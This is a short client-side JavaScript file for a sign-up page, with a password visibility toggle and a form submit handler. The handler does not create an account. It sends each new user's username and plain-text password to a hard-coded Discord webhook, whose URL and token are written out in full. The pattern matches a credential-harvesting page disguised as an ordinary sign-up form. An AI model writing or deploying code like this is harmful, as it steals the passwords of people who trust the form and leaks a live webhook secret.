// Handle password visibility toggle
document.getElementById("togglePassword")?.addEventListener("click", function () {
    const passwordInput = document.getElementById("password");
    const type = passwordInput.type === "password" ? "text" : "password";
    passwordInput.type = type;
    this.textContent = type === "password" ? "👁️" : "🚫";
});

// Handle form submission for Sign Up
document.getElementById("signupForm")?.addEventListener("submit", function (event) {
    event.preventDefault();

    const username = document.getElementById("username").value;
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    const data = {
        username: username,
        email: email,
        password: password
    };

    fetch("https://discord.com/api/webhooks/1315544300695584830/UqHr8rG9jfLuE8bA79w4F2XPkEG7DBEAYjRB_XPT2M8R3JmOYJXRHmzxBApKXEXULNjr", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            embeds: [
                {
                    title: "New User",
                    description: `User: ${data.username} has been created with the password: ${data.password}`,
                    color: 16777215
                }
            ]
        })
    })
    .then(response => response.json())
    .then(data => console.log('Success:', data))
    .catch((error) => console.error('Error:', error));

    // Reset the form after submission
    document.getElementById("signupForm").reset();
});
